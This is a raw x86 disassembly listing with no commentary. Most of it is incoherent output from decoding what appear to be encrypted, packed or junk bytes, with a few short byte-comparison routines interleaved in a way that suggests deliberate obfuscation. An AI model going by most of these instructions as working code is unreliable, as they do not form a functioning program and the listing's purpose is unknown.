  410b83:	in     al,dx
  410b84:	mov    dl,0xc2
  410b86:	xor    DWORD PTR [ebx],ecx
  410b88:	mul    DWORD PTR [esi]
  410b8a:	and    eax,DWORD PTR [eax-0x7]
  410b8d:	sub    eax,0x3a377a45
  410b92:	or     eax,0xed32417
  410b97:	mov    al,0xc
  410b99:	clc    
  410b9a:	inc    ebx
  410b9b:	in     al,dx
  410b9c:	fdiv   st(1),st
  410b9e:	shl    BYTE PTR [esp+edi*2+0xb5c937c],0x4c
  410ba6:	mov    ah,0x67
  410ba9:	push   ebx
  410baa:	cmc    
  410bab:	in     eax,dx
  410bac:	add    al,0xa9
  410bae:	adc    ebx,DWORD PTR [ecx]
  410bb0:	mov    al,ds:0xf44177e1
  410bb5:	xchg   esp,eax
  410bb6:	cli    
  410bb7:	mov    ebp,0x2bdd3bf
  410bbc:	jmp    0x410b4b
  410bbe:	mov    edi,0x435af1f0
  410bc3:	xor    ch,dh
  410bc5:	in     eax,0x22
  410bc7:	nop
  410bc8:	xor    bh,BYTE PTR [esi+edi*8+0x25]
  410bcc:	and    eax,0xa3efb4d1
  410bd1:	push   ecx
  410bd2:	pop    esi
  410bd3:	arpl   cx,si
  410bd5:	ret    
  410bd6:	and    eax,0x4ce99af8
  410bdb:	in     eax,dx
  410bdc:	add    BYTE PTR [eax],0x97
  410bdf:	push   es
  410be0:	or     DWORD PTR [ebp+edi*2+0x7d2c223c],0x55b367cd
  410beb:	and    bl,cl
  410bed:	dec    esi
  410bee:	inc    edx
  410bef:	jmp    0x410c68
  410bf1:	mov    dl,0x6b
  410bf3:	aad    0x81
  410bf5:	outs   dx,DWORD PTR ds:[esi]
  410bf6:	fld    TBYTE PTR [edi]
  410bf8:	scas   eax,DWORD PTR es:[edi]
  410bf9:	add    bl,BYTE PTR [eax]
  410bfb:	bnd ja 0x410c16
  410bfe:	rcr    BYTE PTR [edx+0x31dbe85f],0x47
  410c05:	daa    
  410c06:	jge    0x410c49
  410c08:	loopne 0x410b91
  410c0a:	js     0x410bd6
  410c0c:	dec    edx
  410c0d:	add    ebx,edi
  410c0f:	jl     0x410bbf
  410c11:	dec    esp
  410c12:	and    dl,BYTE PTR [ebx]
  410c14:	mov    al,ds:0x5ebb8b50
  410c19:	je     0x410c82
  410c1b:	(bad)  
  410c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c1d:	mov    eax,0x4772f345
  410c22:	or     eax,0x39e987e2
  410c27:	cdq    
  410c28:	ins    DWORD PTR es:[edi],dx
  410c29:	mov    cl,0x81
  410c2b:	(bad)  
  410c2c:	in     eax,dx
  410c2d:	mov    bl,0x12
  410c2f:	arpl   WORD PTR [ecx],bp
  410c31:	imul   DWORD PTR [ebx]
  410c33:	inc    edi
  410c34:	cmp    al,BYTE PTR [ecx-0x19]
  410c37:	dec    edx
  410c38:	jmp    DWORD PTR [edx+edi*8-0x6c6fa94a]
  410c3f:	xchg   edi,eax
  410c40:	jmp    0xd802:0xde74
  410c46:	mov    esp,0x4177edc7
  410c4b:	inc    esi
  410c4c:	sub    edx,DWORD PTR [esi]
  410c4e:	mov    al,0xcc
  410c50:	mov    ?,WORD PTR [edx]
  410c52:	sbb    dl,dh
  410c54:	mov    DWORD PTR [ebp+0x445087ec],ebp
  410c5a:	mov    al,ds:0x9e963f25
  410c5f:	aas    
  410c60:	nop
  410c61:	ffreep st(5)
  410c63:	rol    DWORD PTR [esi-0x77],cl
  410c66:	add    BYTE PTR [ebp-0x16],0x19
  410c6a:	adc    ebx,esi
  410c6c:	mov    edx,0x8f4782da
  410c71:	mov    ds:0x19c63efa,al
  410c76:	mov    cl,0x1
  410c78:	xor    bh,ah
  410c7a:	push   ecx
  410c7b:	mov    edx,0xb804b23a
  410c80:	ja     0x410c73
  410c82:	fst    st(4)
  410c84:	jmp    FWORD PTR [ecx+ecx*8-0x28]
  410c88:	test   al,0xd0
  410c8a:	out    dx,al
  410c8b:	inc    esi
  410c8c:	jge    0x410c8b
  410c8e:	pop    DWORD PTR [esi-0x5d1cba9d]
  410c94:	outs   dx,BYTE PTR ds:[esi]
  410c95:	push   0x98c2af9d
  410c9a:	mov    cl,0xd3
  410c9c:	fwait
  410c9d:	int3   
  410c9e:	icebp  
  410c9f:	cmc    
  410ca0:	cs jle 0x410c65
  410ca3:	cmp    eax,0xa2c9386e
  410ca8:	mov    ebx,0xbd3d15dd
  410cae:	scas   eax,DWORD PTR es:[edi]
  410caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb0:	add    BYTE PTR [edi],al
  410cb2:	pop    ebp
  410cb3:	test   DWORD PTR [edi+edi*2-0x12],0x1a7b67cd
  410cbb:	cmp    ebp,eax
  410cbd:	outs   dx,DWORD PTR ds:[esi]
  410cbe:	shl    BYTE PTR [esi],cl
  410cc0:	nop
  410cc1:	push   ebp
  410cc2:	mov    eax,0xd549e412
  410cc7:	psubusb mm6,QWORD PTR [edx+0xfe72b53]
  410cce:	mov    bh,0x33
  410cd0:	sub    BYTE PTR es:[eax],dl
  410cd3:	sub    al,BYTE PTR ds:0x5e33f9d1
  410cd9:	mov    bl,0x61
  410cdb:	inc    esp
  410cdc:	pop    edi
  410cdd:	and    BYTE PTR [esi],dh
  410cdf:	inc    edi
  410ce0:	test   al,0x8c
  410ce2:	jb     0x410cd5
  410ce4:	cmp    al,0xdb
  410ce6:	pop    es
  410ce7:	repnz shl DWORD PTR [edi-0x6c867f4e],1
  410cee:	push   cs
  410cef:	iret   
  410cf0:	call   DWORD PTR [ebp+0x51]
  410cf3:	and    BYTE PTR [esi+eax*2],bh
  410cf6:	rol    DWORD PTR [edx*2+0x1ad2531b],cl
  410cfd:	pop    edi
  410cfe:	mov    DWORD PTR [ebx-0x6d],esp
  410d01:	rcr    ah,0x83
  410d04:	je     0x410d3f
  410d06:	or     eax,0x99616add
  410d0b:	and    al,0x89
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x1b0d409c
  410d25:	push   ecx
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d0d
  410d2f:	mov    al,0x99
  410d31:	cmp    BYTE PTR [eax+0x24a96050],cl
  410d37:	or     ebx,DWORD PTR [edi-0x3e]
  410d3a:	or     bh,dh
  410d3c:	xor    dh,dh
  410d3e:	sub    ah,BYTE PTR [edx+0x64b3a915]
  410d44:	mov    dl,0xc0
  410d46:	dec    ecx
  410d47:	xor    edx,esi
  410d49:	jmp    0xacab:0x895f03e5
  410d50:	push   edx
  410d51:	ret    
  410d52:	stc    
  410d53:	sub    DWORD PTR [ebx+edx*8],eax
  410d56:	adc    al,0x9b
  410d58:	sub    DWORD PTR ds:0x7d60cf9d,eax
  410d5e:	fidivr WORD PTR [ebp*8+0x47b842fc]
  410d65:	xchg   esp,eax
  410d66:	aad    0xd8
  410d68:	(bad)  
  410d69:	mov    ecx,0x8509f593
  410d6e:	jmp    0x410d95
  410d70:	(bad)  
  410d71:	into   
  410d72:	or     BYTE PTR [edi-0x2563175c],cl
  410d78:	je     0x410d91
  410d7a:	jne    0x410d3f
  410d7c:	push   esi
  410d7d:	xchg   ebp,eax
  410d7e:	inc    esp
  410d7f:	add    al,0x3d
  410d81:	pop    edx
  410d82:	jg     0x410d84
  410d84:	add    eax,0x46691304
  410d89:	jbe    0x410e04
  410d8b:	cmc    
  410d8c:	in     eax,dx
  410d8d:	lds    ebx,FWORD PTR [eax-0x6d]
  410d90:	mov    ds,WORD PTR [ebp+0x5196bc3d]
  410d96:	bound  eax,QWORD PTR [ebx-0x1be1a750]
  410d9c:	push   esi
  410d9d:	fnsave [eiz*1+0x7e4f6edf]
  410da4:	add    esp,esp
  410da6:	push   eax
  410da7:	cmp    al,0xdf
  410da9:	popf   
  410daa:	jl     0x410d62
  410dac:	mov    bh,0xa5
  410dae:	addr16 mov esp,0x347a9cc9
  410db4:	xchg   esi,eax
  410db5:	pop    ebp
  410db6:	in     al,0xed
  410db8:	test   al,0x9f
  410dba:	sub    edi,eax
  410dbc:	jnp    0x410e32
  410dbe:	jne    0x410dc8
  410dc0:	xor    BYTE PTR [edx+0x435820aa],dh
  410dc6:	jo     0x410e1e
  410dc8:	dec    esi
  410dca:	pop    esi
  410dcb:	lock pusha 
  410dcd:	daa    
  410dce:	push   ecx
  410dcf:	sbb    eax,0x38b831e0
  410dd4:	call   0x6374:0x23a887b6
  410ddb:	retf   
  410ddc:	shr    DWORD PTR [ebx-0x2bccb0b3],cl
  410de2:	aam    0xb5
  410de4:	int3   
  410de5:	and    edi,edi
  410de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410de8:	sti    
  410de9:	lahf   
  410dea:	jg     0x410dce
  410dec:	adc    al,0x22
  410dee:	mov    ebp,0x9774eab
  410df3:	int3   
  410df4:	push   ebp
  410df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df6:	clc    
  410df7:	add    cl,bh
  410df9:	lock mov eax,0xc874c7ea
  410dff:	aas    
  410e00:	std    
  410e01:	and    edx,edi
  410e03:	adc    esi,DWORD PTR [esi+0x67110988]
  410e09:	ret    
  410e0a:	ja     0x410e8a
  410e0c:	popa   
  410e0d:	and    DWORD PTR [esi-0x6e],ebx
  410e10:	in     al,0x38
  410e12:	std    
  410e13:	adc    BYTE PTR [edx-0x387ef39c],cl
  410e19:	mov    ah,0xaa
  410e1b:	loop   0x410e39
  410e1d:	xor    esp,edx
  410e1f:	pushf  
  410e20:	call   0xebf:0x2ee7a9e7
  410e27:	cmp    dh,BYTE PTR [ecx+0x7527c447]
  410e2d:	add    BYTE PTR [edi],ah
  410e2f:	dec    eax
  410e30:	stc    
  410e31:	sub    DWORD PTR [edx],0x51
  410e34:	jb     0x410e92
  410e36:	hlt    
  410e37:	jge    0x410e37
  410e39:	pop    ebp
  410e3a:	mov    dh,0x33
  410e3c:	push   cs
  410e3d:	loop   0x410e3c
  410e3f:	ja     0x410ea7
  410e41:	and    bh,BYTE PTR [eax+eiz*1+0x49d3171c]
  410e48:	mov    bh,0xb
  410e4a:	sbb    BYTE PTR [ecx],0xd3
  410e4d:	jg     0x410dd5
  410e4f:	adc    bh,BYTE PTR [edx+ebx*4+0x5e]
  410e53:	test   BYTE PTR [eax+ecx*1+0x19],dh
  410e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e58:	adc    eax,0xc38dd252
  410e5d:	mov    dl,0x72
  410e5f:	aaa    
  410e60:	or     BYTE PTR [ebx],al
  410e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e63:	add    eax,0x6eac292d
  410e68:	xchg   ebx,eax
  410e69:	mov    ebp,0x6ea93322
  410e6e:	ror    DWORD PTR [ebx+0x237f140d],0x5c
  410e75:	imul   ecx,DWORD PTR ds:[esi+0x15],0xf3350c0b
  410e7d:	sbb    BYTE PTR [eax-0x6bed0db4],al
  410e83:	rol    ecx,0x67
  410e86:	pop    esp
  410e87:	outs   dx,DWORD PTR ds:[esi]
  410e88:	sub    edi,DWORD PTR ds:0x50a4deca
  410e8e:	ss in  al,dx
  410e90:	add    al,0xb9
  410e92:	cs xchg edx,eax
  410e94:	enter  0xe3b6,0xc3
  410e98:	popa   
  410e99:	(bad)  
  410e9a:	push   ds
  410e9b:	and    edi,esp
  410e9d:	scas   eax,DWORD PTR es:[edi]
  410e9e:	ja     0x410e24
  410ea0:	sub    eax,0xef725e64
  410ea5:	rcr    cl,0xab
  410ea8:	mov    ecx,DWORD PTR [edi+0x1]
  410eab:	or     eax,0x70ea6087
  410eb0:	add    esp,DWORD PTR [edi]
  410eb2:	lea    ecx,[ebp+ecx*1-0x71]
  410eb6:	inc    eax
  410eb7:	test   ecx,0x976f9195
  410ebd:	enter  0xe806,0x54
  410ec1:	aaa    
  410ec2:	mov    bh,0xeb
  410ec4:	dec    ebx
  410ec5:	out    0xfb,eax
  410ec7:	sti    
  410ec8:	mov    ah,ah
  410eca:	add    DWORD PTR [bx+0x6c],0x9e28ade3
  410ed2:	jbe    0x410e55
  410ed4:	inc    eax
  410ed5:	pusha  
  410ed6:	(bad)  
  410ed7:	inc    DWORD PTR [ebx]
  410ed9:	mov    edx,0xaaa0cccf
  410ede:	pop    ebx
  410edf:	push   edi
  410ee0:	ins    DWORD PTR es:[edi],dx
  410ee1:	test   al,0xc7
  410ee3:	in     eax,dx
  410ee4:	fwait
  410ee5:	adc    al,0xe3
  410ee7:	ror    bh,0x41
  410eea:	or     ah,dh
  410eec:	mov    ecx,eax
  410eee:	imul   ebp,ecx,0x175c08be
  410ef4:	dec    edx
  410ef5:	and    DWORD PTR [ebp-0x58],ebx
  410ef8:	js     0x410ecd
  410efa:	sub    al,0xfe
  410efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410efd:	lahf   
  410efe:	call   0x4881b1dc
  410f03:	pushf  
  410f04:	pop    eax
  410f05:	cmp    ch,dh
  410f07:	rcl    edi,cl
  410f09:	xchg   edx,eax
  410f0a:	xlat   BYTE PTR ds:[ebx]
  410f0b:	mov    cl,cl
  410f0d:	test   DWORD PTR [esi+ecx*8+0x43],esi
  410f11:	mov    edi,DWORD PTR [ecx+0x7c]
  410f14:	jnp    0x410f31
  410f16:	aad    0xf3
  410f18:	add    DWORD PTR [ecx+0x1a78ebd4],ebx
  410f1e:	dec    eax
  410f1f:	jle    0x410f89
  410f21:	frstor [ecx]
  410f23:	call   FWORD PTR [edi]
  410f25:	xor    DWORD PTR [ecx+0xd],edx
  410f28:	loop   0x410eaa
  410f2a:	cdq    
  410f2b:	pop    edi
  410f2c:	adc    ecx,DWORD PTR [eax]
  410f2e:	test   BYTE PTR [edi+0xb4d1697],cl
  410f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f35:	das    
  410f36:	mov    esi,edi
  410f38:	std    
  410f39:	rol    BYTE PTR [esp+eax*4-0x57d906bc],0x94
  410f41:	loopne 0x410fa3
  410f43:	or     ecx,DWORD PTR [ecx]
  410f45:	dec    esi
  410f46:	sar    dh,1
  410f48:	out    0x77,eax
  410f4a:	test   al,0x31
  410f4c:	scas   al,BYTE PTR es:[edi]
  410f4d:	jne    0xfeb66d2e
  410f53:	xor    al,ch
  410f55:	stos   BYTE PTR es:[edi],al
  410f56:	(bad)  
  410f57:	fst    DWORD PTR [edx]
  410f59:	jle    0x410f82
  410f5b:	fld    TBYTE PTR [ebx-0x20095d72]
  410f61:	bnd jmp 0x1ad02140
  410f67:	mov    esp,0x16140437
  410f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6d:	cmp    ecx,DWORD PTR [eax-0x27]
  410f70:	ins    DWORD PTR es:[edi],dx
  410f71:	lea    esp,[edx]
  410f73:	dec    ebx
  410f74:	mov    ecx,0xe4d2de30
  410f79:	gs clc 
  410f7b:	pop    edx
  410f7c:	jg     0x410f76
  410f7e:	sub    edi,DWORD PTR [ebp+esi*1-0x66]
  410f82:	pop    ds
  410f83:	mov    ds:0x80118ee2,al
  410f88:	call   0x5c3dccb6
  410f8d:	xor    eax,0xbd61b8bc
  410f92:	adc    DWORD PTR [edx],ecx
  410f94:	mov    bl,0x98
  410f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f97:	push   ds
  410f98:	inc    edi
  410f99:	add    eax,0x6866d8d3
  410f9e:	adc    ch,BYTE PTR [edi-0x5a739dd6]
  410fa4:	es nop
  410fa6:	fs xchg edx,eax
  410fa8:	cmp    cx,WORD PTR [esi+0x6d]
  410fac:	out    dx,eax
  410fad:	imul   edi,DWORD PTR [esi-0x2ac4a492],0x5135a1f3
  410fb7:	mov    DWORD PTR [ecx-0x1b994c3],ebx
  410fbd:	fs icebp 
  410fbf:	push   edi
  410fc0:	out    0xbb,al
  410fc2:	mov    cl,0x90
  410fc4:	out    0x30,al
  410fc6:	and    eax,DWORD PTR [edx]
  410fc8:	sub    al,0x5b
  410fca:	call   0xdf04d51c
  410fcf:	pop    edx
  410fd0:	lods   eax,DWORD PTR ds:[esi]
  410fd1:	pop    edx
  410fd2:	mov    ah,0xc5
  410fd4:	inc    ebx
  410fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd6:	adc    BYTE PTR cs:[esi+0x0],0xa5
  410fdb:	mov    BYTE PTR [esi-0x3ecc68cc],al
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411070
  41102b:	std    
  41102c:	sbb    eax,0x7e4718e9
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x410fff
  411037:	rcr    al,0xcd
  41103a:	bound  eax,QWORD PTR [edi]
  41103c:	(bad)  
  41103d:	cmp    DWORD PTR [ebx+0x3c],ebp
  411040:	jmp    0x4e40:0x56640613
  411047:	mov    ebx,0xeb293f82
  41104c:	dec    esi
  41104d:	jmp    0x411081
  41104f:	push   0xb85f71c4
  411054:	outs   dx,BYTE PTR ds:[esi]
  411055:	int    0x1d
  411057:	mov    bl,bh
  411059:	sahf   
  41105a:	sub    esp,ebp
  41105c:	aaa    
  41105d:	pop    ebx
  41105e:	fs push ebx
  411060:	mov    edx,0x4527fc6c
  411065:	adc    eax,DWORD PTR [ebx+ebp*4+0x7c58619c]
  41106c:	cmp    al,0x19
  41106e:	sbb    al,0x79
  411070:	pop    ecx
  411071:	(bad)
  411075:	mov    ch,0xfd
  411077:	mov    esp,edi
  411079:	lods   al,BYTE PTR ds:[esi]
  41107a:	mov    ah,0xf3
  41107c:	icebp  
  41107d:	loopne 0x4110e2
  41107f:	mov    ds:0xabf2ccc7,eax
  411084:	jmp    0x4c04d680
  411089:	mov    eax,ds:0x513bfd0e
  41108e:	or     BYTE PTR [ebx-0x26edef0],dh
  411094:	aam    0x53
  411096:	js     0x4110f1
  411098:	xchg   edx,eax
  411099:	test   eax,0xe4b8c51c
  41109e:	or     eax,0xd125757e
  4110a3:	fsub   DWORD PTR [edx+0x55]
  4110a6:	and    DWORD PTR [eax],ecx
  4110a8:	lds    edi,FWORD PTR [ebp-0x550e7007]
  4110ae:	out    dx,eax
  4110af:	imul   esi,DWORD PTR [edi-0x7c],0xe
  4110b3:	mov    ebx,0xc2bbc131
  4110b8:	mov    bh,0xd3
  4110ba:	adc    bh,0x11
  4110bd:	ins    DWORD PTR es:[edi],dx
  4110be:	retf   0x3ba6
  4110c1:	or     edi,DWORD PTR [ecx]
  4110c3:	mov    bh,0xf9
  4110c5:	test   BYTE PTR [edi+0x3bd8e5a2],dh
  4110cb:	xchg   edi,eax
  4110cc:	mov    ds:0xd80c265,eax
  4110d1:	adc    bl,BYTE PTR [ebx-0xb]
  4110d4:	dec    ecx
  4110d5:	nop
  4110d6:	fstp   QWORD PTR [edi-0x1a08e5ea]
  4110dc:	dec    ebp
  4110dd:	mov    eax,0xbaaf231c
  4110e2:	xor    edi,DWORD PTR [eax]
  4110e4:	xor    eax,0xdd31dba3
  4110e9:	inc    edi
  4110ea:	dec    edx
  4110eb:	adc    al,0xf6
  4110ed:	push   esp
  4110ee:	aaa    
  4110ef:	icebp  
  4110f0:	push   cs
  4110f1:	jnp    0x411104
  4110f3:	mov    ch,0xfb
  4110f5:	cld    
  4110f6:	push   ss
  4110f7:	pushf  
  4110f8:	pop    esp
  4110f9:	xchg   esi,eax
  4110fa:	pop    DWORD PTR [ebp-0x59f87d89]
  411100:	xchg   ebp,eax
  411101:	push   ss
  411102:	push   ds
  411103:	sbb    al,0x3
  411105:	cmp    DWORD PTR [eax-0x5db18f12],eax
  41110b:	mov    ebx,DWORD PTR [esp+eax*8]
  41110e:	test   al,0x6
  411110:	dec    ebx
  411111:	jl     0x4110c4
  411113:	outs   dx,BYTE PTR ds:[esi]
  411114:	pop    esp
  411115:	cdq    
  411116:	jecxz  0x4110ea
  411118:	add    BYTE PTR [ecx],bl
  41111a:	fisub  DWORD PTR ds:0x1707f90c
  411120:	fsub   DWORD PTR [esp+eiz*2+0x57]
  411124:	ficomp DWORD PTR [ecx-0x53]
  411127:	jle    0x411105
  411129:	push   0x82ea092e
  41112e:	sbb    DWORD PTR [edi],ebp
  411130:	xchg   BYTE PTR [esi+0x53f50100],dh
  411136:	dec    eax
  411137:	sbb    DWORD PTR [edi+0x13986d43],esp
  41113d:	nop
  41113e:	shl    DWORD PTR [ebp-0xc5cf790],cl
  411144:	cdq    
  411145:	gs mov eax,0x60f79b42
  41114b:	sub    BYTE PTR ds:0x8d01311f,0xca
  411152:	leave  
  411153:	dec    edx
  411154:	xor    esi,0x39
  411157:	push   edx
  411158:	dec    eax
  411159:	inc    esi
  41115a:	pop    ebx
  41115b:	hlt    
  41115c:	and    DWORD PTR [ecx+0x3d],esi
  41115f:	pop    eax
  411160:	jecxz  0x4111e1
  411162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411163:	sbb    ebp,DWORD PTR [ebp-0x59]
  411166:	pushf  
  411167:	hlt    
  411168:	jmp    0xdc9:0x1e481003
  41116f:	mov    ebx,0x2050d8e5
  411174:	loopne 0x4111ac
  411176:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411178:	push   ds
  411179:	arpl   WORD PTR [ecx],bp
  41117b:	sub    BYTE PTR [ebx+0x7b],ch
  41117e:	imul   ecx,DWORD PTR [ebx],0x59
  411181:	add    edx,DWORD PTR [ecx]
  411183:	sbb    DWORD PTR [esi+0x33],esi
  411186:	dec    edx
  411187:	cli    
  411188:	jmp    0x411154
  41118a:	sbb    esp,esi
  41118c:	push   edx
  41118d:	xor    BYTE PTR [esi],bl
  41118f:	sbb    eax,0x598aa445
  411194:	pop    es
  411195:	fnstenv [esi+0x41acd95c]
  41119b:	test   DWORD PTR ds:0x4ec61f81,edx
  4111a1:	scas   al,BYTE PTR es:[edi]
  4111a2:	add    BYTE PTR [edi+0x1edf5fa8],0x52
  4111a9:	fcmovb st,st(1)
  4111ab:	sti    
  4111ac:	sbb    ecx,DWORD PTR [edi]
  4111ae:	in     al,0xf4
  4111b0:	(bad)  
  4111b1:	ins    DWORD PTR es:[edi],dx
  4111b2:	and    esi,DWORD PTR [eax-0x78705bb4]
  4111b8:	(bad)  
  4111b9:	mov    cl,0x5e
  4111bb:	fdivp  st(1),st
  4111bd:	push   esp
  4111be:	xor    DWORD PTR [ecx+ebx*4],ebx
  4111c1:	adc    DWORD PTR [ecx],edi
  4111c3:	push   eax
  4111c4:	xchg   ecx,eax
  4111c5:	dec    edi
  4111c6:	mov    WORD PTR ds:0xcb6dd0de,?
  4111cc:	pop    esp
  4111cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111ce:	xchg   DWORD PTR [edi-0x28],esp
  4111d1:	xchg   esp,eax
  4111d2:	or     BYTE PTR [edx+0x681d16ae],0x41
  4111d9:	sub    eax,0x35e8567b
  4111de:	pop    eax
  4111df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e0:	or     esp,ebx
  4111e2:	aas    
  4111e3:	outs   dx,DWORD PTR ds:[esi]
  4111e4:	sub    cl,0x73
  4111e7:	(bad)  
  4111e8:	xchg   DWORD PTR [ebp+0x131814fa],ebp
  4111ee:	pop    edi
  4111ef:	sti    
  4111f0:	rcr    BYTE PTR [edx],0x9b
  4111f3:	push   eax
  4111f4:	jle    0x411242
  4111f6:	and    eax,0x5ff1dd77
  4111fb:	inc    edi
  4111fc:	jbe    0x41125e
  4111fe:	rcl    BYTE PTR [eax-0x79],1
  411201:	dec    ebx
  411202:	and    bh,BYTE PTR [esi]
  411204:	or     eax,0x49e90c43
  411209:	outs   dx,BYTE PTR ds:[esi]
  41120a:	mov    al,0xf3
  41120c:	(bad)  
  41120d:	mov    edx,DWORD PTR [esi]
  41120f:	jae    0x411288
  411211:	daa    
  411212:	enter  0x683b,0x97
  411216:	xor    bh,BYTE PTR [eax*1+0x1f8a5198]
  41121d:	mov    ah,0xb5
  41121f:	jne    0x41123f
  411221:	mov    BYTE PTR ds:0x76e22c2f,bh
  411227:	adc    eax,edx
  411229:	push   cs
  41122a:	pop    eax
  41122b:	in     eax,0xf1
  41122d:	fild   QWORD PTR [edi]
  41122f:	stos   DWORD PTR es:[edi],eax
  411230:	(bad)  
  411231:	xchg   edx,eax
  411232:	pop    esp
  411233:	retf   0x503c
  411236:	mov    edx,0x550161b9
  41123b:	adc    ebp,DWORD PTR [esi+0x746c69c6]
  411241:	pop    esi
  411242:	imul   DWORD PTR [ebp+0xf816a9a]
  411248:	scas   al,BYTE PTR es:[edi]
  411249:	xlat   BYTE PTR ds:[ebx]
  41124a:	add    BYTE PTR [ecx-0x15a4d08a],bl
  411250:	xchg   esi,eax
  411251:	ret    
  411252:	mov    ds:0x28dae2e3,al
  411257:	es dec ebp
  411259:	pusha  
  41125a:	xor    ebx,ecx
  41125c:	retf   0x3c6e
  41125f:	das    
  411260:	loop   0x411213
  411262:	add    cl,0xf
  411265:	arpl   WORD PTR [eax],bp
  411267:	jno    0x4112c5
  411269:	into   
  41126a:	jg     0x411243
  41126c:	pinsrw mm1,ecx,0x53
  411270:	push   ds
  411271:	arpl   WORD PTR [ecx-0xb],bx
  411274:	loop   0x4112d7
  411276:	jl     0x4112e3
  411278:	adc    eax,0x75733bb4
  41127d:	sub    ah,bl
  41127f:	jle    0x4112e7
  411281:	fsubr  QWORD PTR [esi]
  411283:	xor    BYTE PTR [ecx-0x514db78d],0xa4
  41128a:	call   0xa3998d4d
  41128f:	mov    ecx,0xd01414f0
  411294:	in     al,dx
  411295:	and    edi,ebp
  411297:	or     al,0x52
  411299:	sub    DWORD PTR [ecx+0x3e49ad66],ebx
  41129f:	and    edi,DWORD PTR [edx-0x5a]
  4112a2:	stos   DWORD PTR es:[edi],eax
  4112a3:	fist   DWORD PTR [ecx-0x40ffabca]
  4112a9:	and    DWORD PTR [eax+0x1f734a7a],edx
  4112af:	add    al,0x59
  4112b1:	shl    DWORD PTR [esi-0x13],0x42
  4112b5:	enter  0xa26b,0xf4
  4112b9:	nop
  4112ba:	adc    al,0x39
  4112bc:	adc    al,0x1f
  4112be:	and    cl,BYTE PTR [edi]
  4112c0:	xchg   ebx,eax
  4112c1:	and    al,0x16
  4112c3:	xchg   ecx,ebp
  4112c5:	in     al,dx
  4112c6:	enter  0xd22c,0x4b
  4112ca:	adc    al,0x4f
  4112cc:	mov    cl,0x36
  4112ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112cf:	adc    al,0x6c
  4112d1:	in     al,0xa2
  4112d3:	aaa    
  4112d4:	or     eax,0xe540cf5a
  4112d9:	lods   eax,DWORD PTR ds:[esi]
  4112da:	sub    al,0xe1
  4112dc:	fiadd  DWORD PTR [ebx]
  4112de:	cmp    edi,DWORD PTR [edx-0x30645c15]
  4112e4:	sbb    BYTE PTR [ecx-0x17bf0a0],ah
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9968f61e,eax
  411318:	xlat   BYTE PTR ds:[ebx]
  411319:	mov    ebp,0x7e4549ae
  41131e:	jle    0x4112cf
  411320:	jl     0x4113a0
  411322:	jle    0x4112ac
  411324:	lea    edi,[eax+edx*8]
  411327:	adc    BYTE PTR [ebx-0x1e],0xad
  41132b:	sar    DWORD PTR [ebp+0x37d1b165],cl
  411331:	imul   edi,esi,0x97967850
  411337:	call   0x473e:0xed025a61
  41133e:	pushf  
  41133f:	pop    ds
  411340:	js     0x4113b4
  411342:	mov    dl,0xfc
  411344:	mov    esi,0x5a442897
  411349:	loope  0x411354
  41134b:	out    dx,al
  41134c:	es jl  0x4112dc
  41134f:	jecxz  0x411387
  411351:	mov    ebx,eax
  411353:	ja     0x4112f1
  411355:	ja     0x4112ec
  411357:	sub    cl,ch
  411359:	call   0x6b62:0xcabc718e
  411360:	loopne 0x41134a
  411362:	in     al,0xa6
  411364:	int3   
  411365:	fdivp  st(1),st
